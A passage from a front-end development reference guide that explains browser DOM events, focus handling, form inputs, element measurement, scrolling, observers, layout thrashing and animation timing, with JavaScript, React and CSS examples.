    panel.style.width = `${startWidth + ev.clientX - startX}px`;
  }
  function onUp(ev) {
    handle.releasePointerCapture(ev.pointerId);   // also released automatically on pointerup
    handle.removeEventListener('pointermove', onMove);
    handle.removeEventListener('pointerup', onUp);
    handle.removeEventListener('pointercancel', onUp);
  }
  handle.addEventListener('pointermove', onMove);
  handle.addEventListener('pointerup', onUp);
  handle.addEventListener('pointercancel', onUp);  // ‼️ fires when the browser takes over
                                                   // (starts scrolling, gesture, alert)
});
```

```css
/* ‼️ On touch devices the browser starts scrolling/zooming on a drag and sends
   pointercancel to your code. Tell it which gestures it should NOT handle: */
.drag-handle  { touch-action: none; }        /* JS gets every move */
.carousel     { touch-action: pan-y; }       /* browser scrolls vertically, JS gets horizontal */
.map          { touch-action: none; }
/* Also stop text selection while dragging */
.dragging     { user-select: none; }
```

```text
Hover-like events:
  mouseover / mouseout   bubble; fire again when moving between CHILDREN
                         (relatedTarget = the element you came from / went to)
  mouseenter / mouseleave  don't bubble; fire once for the element as a whole
                         → ‼️ almost always what you want for hover menus/tooltips
  (pointer* versions behave the same way)

  CSS :hover is usually better than JS for pure styling.
```

```js
// Touch events (when you need multi-touch, e.g. pinch)
el.addEventListener('touchmove', (e) => {
  e.touches;          // all fingers currently on the screen
  e.targetTouches;    // fingers that started on this element
  e.changedTouches;   // fingers that changed in this event
  const [a, b] = e.touches;
  if (a && b) {
    const distance = Math.hypot(a.clientX - b.clientX, a.clientY - b.clientY);
  }
}, { passive: false });   // passive: false only if you will preventDefault
```

---

## 11. Keyboard Events

```text
EVENTS:
  keydown   fires when pressed, and REPEATS while held (e.repeat === true)
            ‼️ the one to use for shortcuts and for preventDefault (stops typing,
            stops Tab moving focus, stops Space scrolling)
  keyup     fires on release
  keypress  ❌ deprecated — don't use

  Keyboard events fire on the FOCUSED element (or body if nothing is focused)
  and bubble to document/window. So:
    - a global shortcut → listen on document / window
    - a shortcut for one widget → listen on that widget (it must be focusable, §12)
```

```text
‼️ e.key vs e.code

  e.key    = the CHARACTER / meaning, after keyboard layout and Shift
             "a", "A", "1", "!", "Enter", "Escape", " " (space!), "ArrowDown",
             "Tab", "Backspace", "Delete", "Shift", "Meta", "Control", "Alt"
  e.code   = the PHYSICAL KEY position, layout-independent
             "KeyA", "Digit1", "Space", "Enter", "ArrowDown", "ShiftLeft"

  Use key for:  shortcuts that mean a letter ("Ctrl+K", "?"), Enter, Escape, arrows
  Use code for: games / WASD where the POSITION matters (on AZERTY, W key is "z")

  ‼️ e.keyCode / e.which are deprecated numbers. Don't write new code with them
     (exception: keyCode === 229 for IME, below).
  ‼️ Space is e.key === ' ' — not 'Space'.
  ‼️ With Shift held, e.key for "a" is "A". Compare case-insensitively for shortcuts.
  ‼️ On Mac, Alt (Option) + letter changes e.key: Option+K → "˚". Use e.code for
     Alt-based shortcuts.
```

```js
// ── A keyboard shortcut handler ─────────────────────────────────────────────
const isMac = /Mac|iPhone|iPad/.test(navigator.platform);   // or navigator.userAgentData

document.addEventListener('keydown', (e) => {
  // Don't steal keys while the user is typing in a field
  const t = e.target;
  const typing = t instanceof HTMLElement &&
    (t.isContentEditable || ['INPUT', 'TEXTAREA', 'SELECT'].includes(t.tagName));

  const mod = isMac ? e.metaKey : e.ctrlKey;     // Cmd on Mac, Ctrl elsewhere

  if (mod && e.key.toLowerCase() === 'k') {      // Cmd/Ctrl+K — works even while typing
    e.preventDefault();                          // block the browser's own Ctrl+K
    openCommandPalette();
    return;
  }
  if (typing) return;
  if (e.key === '/' ) { e.preventDefault(); focusSearch(); }
  if (e.key === 'Escape') closeAll();
});
```

```text
‼️ IME COMPOSITION — Chinese / Japanese / Korean input

   While typing pinyin (e.g. "nihao" → 你好), the text is being COMPOSED.
   Pressing Enter to pick a candidate also fires keydown with key "Enter".
   If your code submits on Enter, it submits a half-typed message. ← very common bug
   in chat inputs, search boxes, todo inputs.

   Events during composition:
     compositionstart → (keydown with isComposing: true, keyCode 229) …
     compositionupdate … → compositionend

   Fix: ignore Enter while composing.
```

```js
function onKeyDown(e) {
  // e.isComposing is true while an IME is composing.
  // keyCode 229 is the extra guard: Safari fires compositionend BEFORE the keydown of
  // the Enter that commits the candidate, so isComposing is already false there,
  // but keyCode is still 229.
  if (e.isComposing || e.keyCode === 229) return;
  if (e.key === 'Enter' && !e.shiftKey) {
    e.preventDefault();       // don't insert a newline in a textarea
    send();
  }
}
// React: e.nativeEvent.isComposing (the synthetic KeyboardEvent doesn't expose it
// in every version — read it from nativeEvent to be safe).
```

```jsx
// React keyboard handling for a custom widget (listbox navigation)
function onKeyDown(e) {
  switch (e.key) {
    case 'ArrowDown': e.preventDefault(); setActive(i => Math.min(i + 1, items.length - 1)); break;
    case 'ArrowUp':   e.preventDefault(); setActive(i => Math.max(i - 1, 0)); break;
    case 'Home':      e.preventDefault(); setActive(0); break;
    case 'End':       e.preventDefault(); setActive(items.length - 1); break;
    case 'Enter':     select(items[active]); break;
    case 'Escape':    close(); break;
  }
  // preventDefault on arrows stops the page from scrolling while you navigate the list
}
```

---

## 12. Focus

```text
WHAT CAN BE FOCUSED:
  natively: <a href>, <button>, <input>, <select>, <textarea>, <summary>,
            [contenteditable], <iframe>, <audio/video controls>
  NOT: disabled controls, elements with display:none / visibility:hidden,
       elements inside [inert], <div>/<span> without tabindex

  tabindex="0"   → focusable AND in the Tab order (in DOM order)
  tabindex="-1"  → focusable by el.focus() but NOT by Tab
                   (headings you jump to, the container of a roving-tabindex widget,
                   dialog panels)
  tabindex="1+"  → ❌ never: it jumps ahead of everything and wrecks the order

  document.activeElement → the focused element (body when nothing is)
  el.focus()                       → move focus (scrolls it into view)
  el.focus({ preventScroll: true }) → move focus without scrolling
  el.blur()
```

```text
‼️ FOCUS EVENTS

  focus / blur          on the element itself; DON'T bubble
  focusin / focusout    same moments, but BUBBLE → use these on a container
                        (React's onFocus/onBlur are these — they bubble, §9)

  ORDER when focus moves from A to B:
    blur(A) → focusout(A) → focus(B) → focusin(B)

  e.relatedTarget:
    in blur/focusout → the element RECEIVING focus (null if none / not focusable)
    in focus/focusin → the element that LOST focus
```

```jsx
// ‼️ "Did focus leave this whole component?" — the correct check
function Combobox() {
  function onBlur(e) {
    // React onBlur bubbles, so this runs when focus leaves ANY child.
    // relatedTarget = where focus is going. If that's still inside us, ignore.
    if (!e.currentTarget.contains(e.relatedTarget)) {
      setOpen(false);
    }
  }
  return <div onBlur={onBlur}>...</div>;
}
```

```text
‼️ THE BLUR-BEFORE-CLICK BUG

   An input with a dropdown. The input's onBlur closes the dropdown.
   User clicks an option → nothing happens.

   Why: order is mousedown(option) → blur(input) → [dropdown unmounts] → mouseup → click.
        The option no longer exists when click would fire.

   Fixes (pick one):
   1. onMouseDown={e => e.preventDefault()} on the options (or the menu):
      cancelling mousedown's default action means focus doesn't move, so the input
      never blurs. Same trick keeps a text editor's selection when you click a
      toolbar button.
   2. Select on onMouseDown / onPointerDown instead of onClick.
   3. The relatedTarget check above (needs options to be focusable: tabIndex={-1}).

   ‼️ Safari (macOS) does NOT focus <button> on click, so relatedTarget is null when
      you click a button — fix #1 or #3 with tabIndex on the menu is the reliable one.
```

```css
/* :focus         — every focus, including mouse clicks on buttons
   :focus-visible — only when the browser thinks a ring is useful (keyboard nav,
                    any text input). ‼️ Use this for focus rings — never remove
                    outlines without a replacement. */
button:focus-visible { outline: 2px solid var(--ring); outline-offset: 2px; }

/* :focus-within — the element OR any descendant has focus (style a form group) */
.field:focus-within { border-color: var(--ring); }
```

```js
// ── Focus management patterns ───────────────────────────────────────────────
// 1. Opening a modal/menu: remember where focus was, move it in, restore on close.
const previouslyFocused = document.activeElement;
dialog.querySelector('[autofocus], button, input')?.focus();
// ...on close:
previouslyFocused?.focus();

// 2. Make the background unreachable while a modal is open
document.querySelector('main').inert = true;   // no focus, no clicks, hidden from screen readers
// (<dialog>.showModal() does this for you — §31)

// 3. All focusable elements inside a container (for a focus trap)
const FOCUSABLE = 'a[href], button:not([disabled]), input:not([disabled]), ' +
  'select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])';
const nodes = [...container.querySelectorAll(FOCUSABLE)];
```

```jsx
// React: autoFocus works on mount (React calls .focus() itself).
<input autoFocus />
// For focus after an interaction, use a ref:
const inputRef = useRef(null);
<button onClick={() => inputRef.current?.focus()}>Edit</button>
// ‼️ Focusing an element that only appears after setState: it isn't in the DOM yet in
// the same handler. Focus it in an effect, a ref callback, or after flushSync (§27).
```

---

## 13. Forms and Inputs

```text
‼️ input vs change

  input    fires on EVERY change to the value: each keystroke, paste, cut, drag-drop,
           autofill, IME update. → live search, character counters, validation as you type
  change   fires when the change is COMMITTED:
             text inputs / textarea  → on blur, if the value changed
             checkbox / radio         → immediately on toggle
             select                   → immediately on pick
             file input               → after files are chosen
             range                    → on release (input fires while dragging)

  ‼️ React's onChange = native input. In React you almost never listen to the native
     change event; if you want "on commit" behaviour, use onBlur.

  beforeinput  fires BEFORE the value changes and is cancelable → block characters
               (e.data = the text being inserted, e.inputType = "insertText",
               "deleteContentBackward", "insertFromPaste", ...)
```

```js
// ── Submit ──────────────────────────────────────────────────────────────────
form.addEventListener('submit', (e) => {
  e.preventDefault();                       // ‼️ otherwise the page navigates/reloads
  const data = new FormData(form);          // reads every named field
  data.get('email');                        // one value (string or File)
  data.getAll('tags');                      // all values for checkboxes with the same name
  const obj = Object.fromEntries(data);     // { email: '...', password: '...' }
                                            // (keeps only the LAST value of repeated names)
  e.submitter;                              // the button that submitted (if any) —
                                            // tells "Save" from "Save as draft"
  e.submitter?.value;
});

// ‼️ Only fields with a name="" attribute appear in FormData. Disabled fields are skipped.
//    Unchecked checkboxes are absent (not "false").
```

```text
‼️ FORM GOTCHAS THAT BITE EVERYONE

  1. <button> inside a <form> defaults to type="submit".
     A "Cancel", "Add row" or "Show password" button with no type submits the form.
     → Always write type="button" for non-submit buttons.

  2. Pressing Enter in a text input submits the form (implicit submission) —
     if the form has a submit button, or only one text field. This is GOOD:
     use <form onSubmit> instead of onKeyDown Enter handlers, and you get Enter-to-submit,
     mobile "Go" key, and password-manager support for free.

  3. form.submit()        → submits WITHOUT firing 'submit' and WITHOUT validation.
     form.requestSubmit() → behaves like clicking a submit button: validates, fires
                            'submit' (your handler runs). ‼️ Use requestSubmit.

  4. A field named "submit", "action" or "method" overwrites form.submit / form.action
     (named fields become properties on the form element). Avoid those names.

  5. form.reset() restores DEFAULT values (defaultValue / defaultChecked), not "empty",
     and fires 'reset'. With React controlled inputs, reset your state instead.
```

```js
// ── Built-in validation (Constraint Validation API) ─────────────────────────
// <input name="email" type="email" required minlength="5">
input.checkValidity();      // true/false, fires 'invalid' on failure (doesn't show UI)
input.reportValidity();     // same + shows the browser's message bubble
input.validity;             // { valueMissing, typeMismatch, tooShort, patternMismatch, ... }
input.validationMessage;    // the browser's localized message
input.setCustomValidity('Email already taken');   // marks invalid with your message
input.setCustomValidity('');                      // ‼️ must clear it, or it stays invalid
form.noValidate = true;     // <form noValidate> — skip browser UI, validate yourself

// CSS: :invalid matches immediately (before the user typed) — looks aggressive.
// :user-invalid matches only after the user interacted. Prefer it.
```

```js
// ── Field-specific bits ─────────────────────────────────────────────────────
input.value;                 // always a STRING, even for type="number"
input.valueAsNumber;         // number (NaN if empty) — type number/range/date
input.valueAsDate;           // Date — type date/time
checkbox.checked;            // boolean
checkbox.indeterminate = true;  // the "some selected" dash — property only, no attribute
select.value;                // the selected option's value
select.selectedOptions;      // for <select multiple>
fileInput.files;             // FileList; fileInput.value = '' lets the same file be picked again
textarea.setSelectionRange(0, 0);   // move the caret
input.select();              // select all text
input.selectionStart; input.selectionEnd;

// Programmatically set a value and let frameworks notice:
input.value = 'x';           // ‼️ fires NO event. React state won't update.
input.dispatchEvent(new Event('input', { bubbles: true }));
// For React-controlled inputs even that isn't enough (React tracks the last value);
// testing libraries handle this — in app code, change the React state instead.
```

```jsx
// ── React: controlled vs uncontrolled ───────────────────────────────────────
// Controlled: React state is the source of truth; the input shows `value`.
const [email, setEmail] = useState('');
<input value={email} onChange={e => setEmail(e.target.value)} />
// ‼️ value without onChange → read-only input + warning.
// ‼️ value={undefined} then a string → "changing an uncontrolled input to be controlled"
//    warning. Initialise with '' not undefined/null.

// Uncontrolled: the DOM holds the value; read it on submit.
function Signup() {
  function onSubmit(e) {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.currentTarget));
    save(data);
  }
  return (
    <form onSubmit={onSubmit}>
      <input name="email" type="email" defaultValue="" required />
      <button>Sign up</button>{/* type="submit" by default — intended here */}
    </form>
  );
}

// React 19: <form action={fn}> — fn receives FormData, works with useActionState and
// useFormStatus, and React resets uncontrolled fields after a successful action.
```

---

## 14. Sizes and Positions — The Measurement Properties

```text
‼️ THE BOX — what each property measures

   ┌─────────────── margin (never included by any property) ───────────────┐
   │ ┌───────────────────── border ─────────────────────────┐              │
   │ │ ┌─────────────────── padding ─────────────────┬────┐ │              │
   │ │ │                                             │ s  │ │              │
   │ │ │            content                          │ c  │ │              │
   │ │ │                                             │ r  │ │              │
   │ │ │                                             │ o  │ │              │
   │ │ │                                             │ l  │ │              │
   │ │ │                                             │ l  │ │              │
   │ │ └─────────────────────────────────────────────┴────┘ │              │
   │ └──────────────────────────────────────────────────────┘              │
   └───────────────────────────────────────────────────────────────────────┘

   clientWidth   = padding + content, MINUS scrollbar           (integer)
   offsetWidth   = border + padding + content + scrollbar       (integer)
   scrollWidth   = full content width including the part scrolled out of view
                   (== clientWidth when nothing overflows)
   getBoundingClientRect().width
                 = like offsetWidth BUT after CSS transforms (scale), and fractional
```

| I want… | Use | Notes |
|---|---|---|
| Visible inner size of a box | `el.clientWidth / clientHeight` | excludes border & scrollbar |
| Full outer size of a box | `el.offsetWidth / offsetHeight` | layout size, ignores `transform: scale` |
| Size as drawn on screen | `el.getBoundingClientRect().width` | includes transforms, sub-pixel |
| Position relative to the **viewport** | `el.getBoundingClientRect().top/left` | ‼️ changes as you scroll |
| Position relative to the **document** | `rect.top + window.scrollY` | stable while scrolling |
| Position relative to positioned parent | `el.offsetTop / offsetLeft` | relative to `el.offsetParent` |
| Content size inc. overflow | `el.scrollWidth / scrollHeight` | |
| Does it overflow? | `el.scrollHeight > el.clientHeight` | text truncation detection: `scrollWidth > clientWidth` |
| Scroll position | `el.scrollTop / scrollLeft`, `window.scrollY` | §15 |
| Viewport size, incl. scrollbar | `window.innerWidth / innerHeight` | matches CSS media queries |
| Viewport size, excl. scrollbar | `document.documentElement.clientWidth` | usable layout width |
| Visible area on mobile (zoom, keyboard) | `window.visualViewport.width/height` | §16 |
| Whole document height | `document.documentElement.scrollHeight` | |
| Screen / pixel density | `screen.width`, `window.devicePixelRatio` | DPR 2 on Retina — scale canvas by it |
| Computed CSS value | `getComputedStyle(el).paddingLeft` | string with units |

```js
// ── getBoundingClientRect in detail ─────────────────────────────────────────
const r = el.getBoundingClientRect();
// { x, y, top, left, right, bottom, width, height } — DOMRect, in CSS pixels,
// relative to the VIEWPORT's top-left. right = left + width, bottom = top + height.

// Is it visible in the viewport right now?
const inView = r.top < window.innerHeight && r.bottom > 0 &&
               r.left < window.innerWidth  && r.right > 0;
// (For ongoing checks, IntersectionObserver is far better — §17)

// Position a fixed-position tooltip below a button
const b = button.getBoundingClientRect();
tooltip.style.position = 'fixed';
tooltip.style.top  = `${b.bottom + 8}px`;   // fixed uses viewport coords → matches rect
tooltip.style.left = `${b.left}px`;

// Position an absolute element inside document.body
tooltip.style.position = 'absolute';
tooltip.style.top  = `${b.bottom + window.scrollY + 8}px`;   // convert to document coords
tooltip.style.left = `${b.left + window.scrollX}px`;
```

```text
‼️ MEASUREMENT GOTCHAS

  - display: none (or not in the document yet) → every size is 0 and the rect is all 0.
    Measure after it's rendered; or use visibility: hidden to keep layout.
  - In React, measure in useLayoutEffect / ref callback — not during render (§27).
  - offsetParent is null for display:none and position:fixed elements.
  - Sizes from offset*/client*/scroll* are ROUNDED integers. Comparisons like
    "scrolled to bottom" need a 1px tolerance (§15).
  - Margins are never included — read them via getComputedStyle if needed.
  - Reading ANY of these forces the browser to finish pending layout → slow inside
    loops that also write styles (§18).
  - jsdom (Jest/Vitest) does no layout: everything is 0 in tests (§36).
```

---

## 15. Scrolling

```js
// ── Reading ─────────────────────────────────────────────────────────────────
window.scrollY;                    // page scroll (pageYOffset is the old alias)
window.scrollX;
document.documentElement.scrollTop;// same as scrollY for the page
el.scrollTop;                      // how far an overflow container is scrolled
el.scrollHeight - el.clientHeight; // max scrollTop

// ‼️ At the bottom? Allow a pixel: scrollTop can be fractional on zoomed / HiDPI screens
const atBottom = el.scrollHeight - el.scrollTop - el.clientHeight < 1;

// ── Writing ─────────────────────────────────────────────────────────────────
window.scrollTo({ top: 0, behavior: 'smooth' });  // absolute
window.scrollBy({ top: 300, behavior: 'smooth' }); // relative
el.scrollTop = el.scrollHeight;                    // jump a chat log to the bottom

el.scrollIntoView({
  behavior: 'smooth',    // or 'auto' / 'instant'
  block: 'nearest',      // vertical: 'start' | 'center' | 'end' | 'nearest'
  inline: 'nearest',     // horizontal
});
// ‼️ block: 'nearest' = scroll only if needed, minimally. Best for keyboard-highlighted
//    list items. 'start' always moves it to the top (jarring in lists).
// scrollIntoView scrolls EVERY scrollable ancestor, including the page — sometimes the
// whole page jumps. If that's a problem, set container.scrollTop yourself.
```

```css
/* Leave room for a sticky header when scrolling to anchors / scrollIntoView */
html { scroll-padding-top: 64px; }
/* or per target */
h2  { scroll-margin-top: 64px; }

/* Smooth scroll for anchor links — respect reduced motion */
@media (prefers-reduced-motion: no-preference) { html { scroll-behavior: smooth; } }

/* Stop scroll chaining: scrolling a modal/sidebar to its end won't scroll the page */
.modal-body { overscroll-behavior: contain; }

/* Snap carousels without JS */
.carousel { scroll-snap-type: x mandatory; overflow-x: auto; }
.slide    { scroll-snap-align: start; }

/* Reserve space for the scrollbar so content doesn't jump when it appears/disappears */
html { scrollbar-gutter: stable; }
```

```text
‼️ THE SCROLL EVENT

  - Fires on the scrolling element. Page scroll → listen on window (or document).
  - Scroll on an element does NOT bubble. React's onScroll doesn't bubble either.
    To catch scroll in any child: addEventListener('scroll', fn, { capture: true }).
  - Fires very often (every frame while scrolling). Keep handlers tiny; throttle
    with requestAnimationFrame (§20). Never do layout reads + writes in it naively.
  - scroll listeners can't block scrolling (scroll isn't cancelable). The events
    that CAN block it are wheel / touchstart / touchmove — which is why browsers make
    those PASSIVE by default on window/document/body, and React makes them passive
    everywhere. Mark your own scroll-related listeners { passive: true }.
  - 'scrollend' fires once scrolling (including smooth scroll and momentum) finishes.
    Supported in Chrome and Firefox; Safari support arrived later — check before relying.

  ‼️ Most "do something on scroll" features are better without a scroll listener:
     - lazy load / infinite scroll / "is it visible"  → IntersectionObserver (§17)
     - sticky header                                  → position: sticky
     - scroll-linked animation / progress bar         → CSS scroll-driven animations
                                                        (animation-timeline: scroll())
     - snap carousels                                 → scroll-snap
```

```js
// ── Scroll lock for modals ──────────────────────────────────────────────────
// Stop the page scrolling behind an open modal, without the content jumping when the
// scrollbar disappears.
function lockScroll() {
  const scrollbar = window.innerWidth - document.documentElement.clientWidth;
  document.documentElement.style.overflow = 'hidden';
  document.documentElement.style.paddingRight = `${scrollbar}px`;  // fill the gap
}
function unlockScroll() {
  document.documentElement.style.overflow = '';
  document.documentElement.style.paddingRight = '';
}
// iOS Safari has historically ignored overflow:hidden on body for touch scrolling;
// a <dialog> opened with showModal() plus overscroll-behavior: contain is the modern
// route. See BROWSER-COMPATIBILITY-DEEP §11.

// ── Scroll restoration on navigation (SPAs) ─────────────────────────────────
history.scrollRestoration = 'manual';  // you restore positions yourself
// React Router: <ScrollRestoration /> component handles it.
```

---

## 16. Resize, Viewport, and Media Queries

```text
‼️ WHICH TOOL FOR "SIZE CHANGED"

  The WINDOW changed size           → window 'resize' event (or matchMedia for breakpoints)
  ONE ELEMENT changed size          → ResizeObserver
                                      (window resize doesn't tell you when a sidebar
                                      collapses, content loads, or a flex sibling grows)
  Crossed a BREAKPOINT              → matchMedia(...).addEventListener('change')
                                      ‼️ fires only when the match flips, not on every pixel
  Mobile keyboard opened / pinch    → window.visualViewport 'resize' / 'scroll'
  Device rotated                    → screen.orientation 'change' (or a matchMedia
                                      '(orientation: portrait)' change)
  Only styling must change          → ‼️ no JS: CSS media queries / container queries
```

```js
// ── window resize ───────────────────────────────────────────────────────────
// Fires many times per second while dragging the window edge. Batch to one per frame.
let frame = 0;
function onResize() {
  cancelAnimationFrame(frame);
  frame = requestAnimationFrame(() => {
    layoutChart(window.innerWidth, window.innerHeight);
  });
}
window.addEventListener('resize', onResize);
// Also fires on mobile when the browser's address bar shows/hides (height changes).
// Use CSS dvh/svh/lvh units for full-height layouts instead of reading innerHeight.

// ── matchMedia — breakpoints and user preferences in JS ─────────────────────
const mq = window.matchMedia('(min-width: 768px)');
mq.matches;                                   // true/false right now
mq.addEventListener('change', (e) => {        // ‼️ addListener() is the deprecated form
  setIsDesktop(e.matches);
});

window.matchMedia('(prefers-color-scheme: dark)').matches;
window.matchMedia('(prefers-reduced-motion: reduce)').matches;
window.matchMedia('(hover: hover) and (pointer: fine)').matches;  // a real mouse
window.matchMedia('(display-mode: standalone)').matches;          // installed PWA

// ── visualViewport — the part actually visible on mobile ────────────────────
// When the on-screen keyboard opens (iOS especially) or the user pinch-zooms,
// window.innerHeight may not change but visualViewport.height does.
window.visualViewport?.addEventListener('resize', () => {
  const vv = window.visualViewport;
  toolbar.style.bottom = `${window.innerHeight - vv.height - vv.offsetTop}px`;
});
```

```jsx
// ‼️ React: subscribe to a media query the right way — useSyncExternalStore
// It handles subscription, cleanup, tearing in concurrent rendering, and SSR.
import { useSyncExternalStore } from 'react';

function useMediaQuery(query) {
  return useSyncExternalStore(
    (onChange) => {                                 // subscribe
      const mq = window.matchMedia(query);
      mq.addEventListener('change', onChange);
      return () => mq.removeEventListener('change', onChange);
    },
    () => window.matchMedia(query).matches,         // getSnapshot (client)
    () => false,                                    // getServerSnapshot (SSR) — pick a default
  );
}
// const isDesktop = useMediaQuery('(min-width: 768px)');
// Prefer CSS for anything that is only styling; use this when the component TREE differs
// (render a drawer vs a sidebar).

function useWindowWidth() {
  return useSyncExternalStore(
    (onChange) => {
      window.addEventListener('resize', onChange);
      return () => window.removeEventListener('resize', onChange);
    },
    () => window.innerWidth,
    () => 1024,
  );
}
// ‼️ Re-renders on every resize event. If you only need breakpoints, use useMediaQuery —
// it re-renders only when the breakpoint flips.
```

```css
/* Container queries — style a component by ITS OWN width, not the window's.
   Often removes the need for ResizeObserver entirely. */
.card-wrapper { container-type: inline-size; }
@container (min-width: 400px) {
  .card { display: grid; grid-template-columns: 120px 1fr; }
}
```

---

## 17. Observers — Resize, Intersection, Mutation

All three share the same shape: create with a callback, `observe(el)`, `unobserve(el)`, `disconnect()` when done. Callbacks are batched and run asynchronously — they don't force layout the way reading `offsetWidth` in a scroll handler does. Deeper coverage: [WEB-APIS-DEEP.md](../2-medium-priority/WEB-APIS-DEEP.md#intersectionobserver).

```js
// ── ResizeObserver — "this element's size changed" ──────────────────────────
const ro = new ResizeObserver((entries) => {
  for (const entry of entries) {
    entry.target;                              // the element
    entry.contentRect.width;                   // content box (no padding/border)
    entry.borderBoxSize[0].inlineSize;         // border box width (writing-mode aware)
    entry.borderBoxSize[0].blockSize;          // border box height
  }
});
ro.observe(el);                                // fires once immediately, then on changes
ro.observe(el, { box: 'border-box' });
ro.disconnect();

// ‼️ "ResizeObserver loop completed with undelivered notifications"
// Appears when your callback changes the size of an observed element, which would need
// another round in the same frame. The browser defers it to the next frame and logs
// this. Usually harmless (error trackers love to report it). Avoid resizing the observed
// element itself inside the callback, or do the change in requestAnimationFrame.
```

```js
// ── IntersectionObserver — "this element entered/left the viewport (or a container)" ──
const io = new IntersectionObserver((entries) => {
  for (const entry of entries) {
    if (entry.isIntersecting) {
      loadMore();                              // infinite scroll sentinel
      // io.unobserve(entry.target);           // lazy-load once
    }
    entry.intersectionRatio;                   // 0..1 how much is visible
  }
}, {
  root: null,              // null = viewport; or a scrolling container element
  rootMargin: '200px',     // grow the root: trigger 200px BEFORE it's visible
  threshold: [0, 0.5, 1],  // fire when crossing these visibility ratios
});
io.observe(sentinel);
// Uses: infinite scroll, lazy loading, analytics "was seen", pause videos off-screen,
// "is the sticky header stuck" (observe a 1px sentinel above it), active TOC section.
```

```js
// ── MutationObserver — "the DOM under this node changed" ────────────────────
const mo = new MutationObserver((mutations) => {
  for (const m of mutations) {
    m.type;            // 'childList' | 'attributes' | 'characterData'
    m.addedNodes; m.removedNodes; m.attributeName; m.oldValue;
  }
});
mo.observe(container, {
  childList: true,      // children added/removed
  subtree: true,        // ...anywhere below, not just direct children
  attributes: true,     // attribute changes
  attributeFilter: ['class', 'aria-expanded'],
  characterData: true,  // text changes
});
mo.disconnect();
// In React apps you rarely need it — you know when your DOM changes. Used for:
// watching DOM that third-party scripts inject, browser extensions, test utilities.
```

```jsx
// React hook: element size via ResizeObserver (callback ref version — works even if the
// element mounts later or is swapped for another node)
function useElementSize() {
  const [size, setSize] = useState({ width: 0, height: 0 });
  const ref = useCallback((node) => {
    if (!node) return;
    const ro = new ResizeObserver(([entry]) => {
      const { inlineSize: width, blockSize: height } = entry.borderBoxSize[0];
      setSize({ width, height });
    });
    ro.observe(node);
    return () => ro.disconnect();   // React 19: ref callbacks may return a cleanup
  }, []);
  return [ref, size];
}
// const [ref, { width }] = useElementSize();  <div ref={ref}>...</div>
// (On React 18, keep the observer in a ref and disconnect when the callback gets null.)
```

---

## 18. Rendering, Reflow, and Layout Thrashing

```text
WHAT HAPPENS AFTER YOU CHANGE THE DOM (one frame, ~16.7ms at 60Hz):

  JS runs → Style (which CSS rules apply) → Layout (sizes & positions)
          → Paint (pixels into layers) → Composite (layers onto screen)

  Change          | Triggers
  ----------------+------------------------------------------
  width, top, font-size, adding nodes, text  → Layout + Paint + Composite  (expensive)
  color, background, box-shadow              → Paint + Composite
  transform, opacity                         → Composite only  ‼️ (cheap — animate these)

  Normally the browser DEFERS style/layout until the end of your JS, doing it once.
```

```text
‼️ FORCED SYNCHRONOUS LAYOUT (reflow) — "layout thrashing"

   If you WRITE a style and then READ a layout value, the browser must do layout
   right now to give you a correct number. Doing that in a loop = layout per iteration.

   Reads that force layout: offsetTop/Left/Width/Height, clientTop/..., scrollTop/...,
   getBoundingClientRect(), getComputedStyle() (for layout props), innerText,
   el.focus(), scrollIntoView(), window.scrollY, innerWidth (in some cases).

   ❌ Thrashing: read/write/read/write
       for (const el of items) {
         el.style.width = box.offsetWidth + 'px';   // READ box (layout!) then WRITE
       }

   ✅ Batch: all reads first, then all writes
       const w = box.offsetWidth;                   // one layout
       for (const el of items) el.style.width = w + 'px';

   ✅ Or move writes to the next frame:
       const heights = items.map(el => el.offsetHeight);       // reads
       requestAnimationFrame(() => items.forEach((el, i) => {   // writes
         el.style.height = heights[i] + 'px';
       }));

   DevTools Performance panel shows these as purple "Layout" blocks with a red
   corner and "Forced reflow" warning.
```

```css
/* Animate cheaply */
.panel { transition: transform 200ms, opacity 200ms; }   /* ✅ composite only */
.panel { transition: left 200ms, height 200ms; }         /* ❌ layout every frame */

/* Hint a layer ahead of a known animation — sparingly, it costs memory */
.drawer { will-change: transform; }

/* Skip rendering work for off-screen sections of long pages */
.section { content-visibility: auto; contain-intrinsic-size: auto 600px; }
```

See [../2-medium-priority/BROWSER-INTERNALS-DEEP.md](../2-medium-priority/BROWSER-INTERNALS-DEEP.md#browser-rendering-pipeline-detailed) and [../2-medium-priority/PERFORMANCE-DEEP.md](../2-medium-priority/PERFORMANCE-DEEP.md).

---

## 19. Timing — setTimeout, requestAnimationFrame, Idle

```text
‼️ WHERE EACH CALLBACK RUNS

  ┌─ task (event handler, setTimeout, message) ─┐
  │   your JS                                   │
  └─────────────────────────────────────────────┘
        ↓ all microtasks: Promise.then, queueMicrotask, await continuations,
          MutationObserver callbacks
        ↓ (if it's time for a frame, ~every 16ms)
        ↓   requestAnimationFrame callbacks       ← read/write layout for the frame here
        ↓   style → layout
        ↓   ResizeObserver callbacks
        ↓   paint
        ↓ (IntersectionObserver callbacks are delivered as a later task)
        ↓ if idle: requestIdleCallback callbacks
  next task...

  setTimeout(fn, 0)      → a new task "as soon as possible" (≥ ~4ms when nested);
                           NOT synced with frames.
  requestAnimationFrame  → right before the next paint. ‼️ Use for anything visual:
                           animations, applying measured positions, throttling
                           scroll/resize/pointermove to one update per frame.
                           Paused in background tabs.
  queueMicrotask         → after the current JS, before rendering. Rarely needed in UI.
  requestIdleCallback    → when the browser has spare time (analytics, prefetch,
                           non-urgent work). ‼️ Not in Safari — fall back to setTimeout.
  scheduler.postTask / scheduler.yield()
                         → Chromium (and newer Firefox): prioritised tasks and
                           "yield to let input run" inside long work. Feature-detect.
```

```js
// ── Animation with rAF ──────────────────────────────────────────────────────
function animate(el, from, to, duration) {
  const start = performance.now();
  function frame(now) {
    const t = Math.min((now - start) / duration, 1);   // 0 → 1
    const eased = 1 - (1 - t) ** 3;                     // easeOutCubic
    el.style.transform = `translateX(${from + (to - from) * eased}px)`;
    if (t < 1) requestAnimationFrame(frame);
  }
  requestAnimationFrame(frame);
}
// Simpler for most UI: CSS transitions, or the Web Animations API:
el.animate([{ opacity: 0 }, { opacity: 1 }], { duration: 200, easing: 'ease-out' });

// ‼️ "Apply a class on the next frame so the transition runs" — a double rAF:
el.style.display = 'block';
requestAnimationFrame(() => requestAnimationFrame(() => el.classList.add('visible')));
// One rAF runs before the first paint, so the starting state may never be painted;
// two guarantees a frame in between. (Or read el.offsetWidth once to force the start
// style — deliberate forced reflow. Or use CSS @starting-style.)
```

```js
